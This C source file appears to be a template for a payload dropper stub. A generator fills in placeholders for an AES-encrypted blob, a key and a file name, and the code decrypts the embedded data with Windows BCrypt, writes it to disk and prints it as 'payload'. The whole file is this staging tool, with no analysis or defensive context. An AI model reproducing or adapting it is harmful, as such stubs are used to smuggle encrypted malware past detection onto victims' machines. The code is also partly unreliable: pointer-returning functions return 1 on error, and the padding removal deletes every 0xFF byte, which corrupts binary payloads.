#include <Windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib,"bcrypt.lib")

#define KEYSIZE 32
#define IVSIZE 16

// [[CIPERTEXT]]

// [[KEY]]

// [[FILENAME]]

PBYTE AddPadding(IN BYTE item[], IN DWORD dwItemSize, IN DWORD modulus, OUT DWORD* dwPaddedSize) {
    DWORD dwPaddingLength = modulus - (dwItemSize % modulus);
    *dwPaddedSize = dwItemSize + dwPaddingLength;

    unsigned char* newItem = malloc(*dwPaddedSize);
    if (newItem == NULL) {
        return NULL;
    }

    memcpy(newItem, item, dwItemSize);

    memset(newItem + dwItemSize, 0xFF, dwPaddingLength);

    return newItem;
}

PBYTE RemovePadding(IN BYTE item[], IN DWORD dwItemSize, OUT DWORD* dwNewItemSize) {
    *dwNewItemSize = 0;

    PBYTE pbyNewItem = malloc(dwItemSize);
    if (!pbyNewItem) {
        return NULL;
    }

    for (SIZE_T i = 0, j = 0; i < dwItemSize; i++) {
        if (item[i] != 0xFF) {
            memset(pbyNewItem + j, item[i], 1);
            j++;
            *dwNewItemSize = j;
        }
    }
    return pbyNewItem;
}

PBYTE AESDeseal(OUT DWORD *dwSize) {
    NTSTATUS status;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    BYTE byIv[IVSIZE];
    BYTE byCiphertext[sizeof(cipertext) - IVSIZE];

    memcpy(byIv, cipertext, IVSIZE);
    memcpy(byCiphertext, cipertext + IVSIZE, sizeof(cipertext) - IVSIZE);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return 1;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 1;
    }

    DWORD dwKeySize = 0;
    unsigned char* bKey = AddPadding(key, sizeof(key), KEYSIZE, &dwKeySize);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, bKey, KEYSIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return 1;
    }

    BYTE bPaddedPlaintext[sizeof(byCiphertext)];
    DWORD dwPaddedPlaintextSize = 0;

    status = BCryptDecrypt(hKey, byCiphertext, sizeof(byCiphertext), NULL, byIv, IVSIZE, bPaddedPlaintext, sizeof(bPaddedPlaintext), &dwPaddedPlaintextSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return 1;
    }

    PBYTE pbyPlaintext = RemovePadding(bPaddedPlaintext, dwPaddedPlaintextSize, dwSize);
    return pbyPlaintext;
}

DWORD WritePayload(LPWSTR filename, PBYTE pbyPlaintext, DWORD dwSize) {
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }

    DWORD bytesWritten;
    if (!WriteFile(hFile, pbyPlaintext, dwSize, &bytesWritten, NULL)) {
        CloseHandle(hFile);
        return -1;
    }
    CloseHandle(hFile);
    return 0;
}

DWORD PrintPayload(PBYTE pbyPlaintext) {
    printf("payload : \"%s\" \n", pbyPlaintext);
}

int main() {
    DWORD dwSize = 0;
    PBYTE pbyPlaintext = AESDeseal(&dwSize);

    WritePayload(filename, pbyPlaintext, dwSize);
    
    PrintPayload(pbyPlaintext);
}